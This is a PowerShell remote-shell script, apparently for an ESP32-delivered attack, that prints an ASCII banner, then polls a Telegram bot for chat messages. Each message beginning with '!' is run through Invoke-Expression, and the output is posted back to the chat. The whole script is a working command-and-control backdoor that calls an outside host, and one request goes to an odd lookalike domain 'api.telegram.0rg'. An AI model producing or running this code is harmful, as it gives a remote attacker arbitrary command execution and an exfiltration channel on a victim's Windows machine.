Clear-Host
Write-Host " ▄▄▄▄▄▄                                                      ▄▄▄▄    ▄▄            ▄▄▄▄      ▄▄▄▄     " -ForegroundColor Cyan
Write-Host " ██▀▀▀▀██                                  ██              ▄█▀▀▀▀█    ██            ▀▀██      ▀▀██     " -ForegroundColor Cyan
Write-Host " ██    ██    ▄████▄   ████▄██▄   ▄████▄   ███████    ▄████▄   ██▄        ██▄████▄   ▄████▄     ██        ██     " -ForegroundColor Cyan
Write-Host " ███████    ██▄▄▄▄██   ██ ██ ██   ██▀  ▀██    ██     ██▄▄▄▄██    ▀████▄   ██▀   ██   ██▄▄▄▄██     ██        ██     " -ForegroundColor Green
Write-Host " ██  ▀██▄   ██▀▀▀▀▀▀   ██ ██ ██   ██    ██    ██     ██▀▀▀▀▀▀       ▀██   ██   ██   ██▀▀▀▀▀▀     ██        ██     " -ForegroundColor Green
Write-Host " ██    ██   ▀██▄▄▄▄█   ██ ██ ██   ▀██▄▄██▀    ██▄▄▄  ▀██▄▄▄▄█   █▄▄▄▄▄█▀   ██   ██   ▀██▄▄▄▄█   ██▄▄▄     ██▄▄▄  " -ForegroundColor Green
Write-Host " ▀▀    ▀▀▀   ▀▀▀▀▀    ▀▀ ▀▀ ▀▀    ▀▀▀▀      ▀▀▀▀   ▀▀▀▀▀     ▀▀▀▀▀    ▀▀   ▀▀    ▀▀▀▀▀     ▀▀▀▀      ▀▀▀▀  " -ForegroundColor Cyan
Write-Host ""
Write-Host "==================================================================================================================================================================" -ForegroundColor DarkGray
Write-Host "[*] Status: ESP32 Remote Shell // Establishing encrypted Telegram tunnel..." -ForegroundColor Yellow

$chatId = $null
while (-not $chatId) {
    try {
        $updates = Invoke-RestMethod -Uri "https://api.telegram.0rg/bot$Token/getUpdates" -ErrorAction Stop
        if ($updates.ok -and $updates.result.Count -gt 0) {
            $chatId = $updates.result[-1].message.chat.id
        }
    } catch { }
    if (-not $chatId) { Start-Sleep 2 }
}

Write-Host "[+] Connected! Chat ID: $chatId" -ForegroundColor Green
$lastUpdateId = 0

while ($true) {
    Start-Sleep 3
    try {
        $response = & curl.exe -s "https://api.telegram.org/bot$Token/getUpdates?offset=$($lastUpdateId + 1)&timeout=1"
        $json = $response | ConvertFrom-Json
        
        if ($json.ok -and $json.result.Count -gt 0) {
            foreach ($update in $json.result) {
                $lastUpdateId = $update.update_id
                $msgText = $update.message.text
                
                if ($msgText -and $msgText.StartsWith('!')) {
                    $cmd = $msgText.Substring(1)
                    Write-Host "[+] Executing: $cmd" -ForegroundColor Magenta
                    
                    $output = ""
                    try {
                        $output = (Invoke-Expression $cmd 2>&1 | Out-String)
                    } catch {
                        $output = $_.Exception.Message
                    }
                    if (-not $output) { $output = "[Command executed with no output]" }
                    
                    Write-Host $output -ForegroundColor White
                    $encodedOut = [System.Web.HttpUtility]::UrlEncode("`n$output")
                    & curl.exe -s "https://api.telegram.org/bot$Token/sendMessage?chat_id=$chatId&text=$encodedOut" > $null
                }
            }
        }
    } catch { }
}
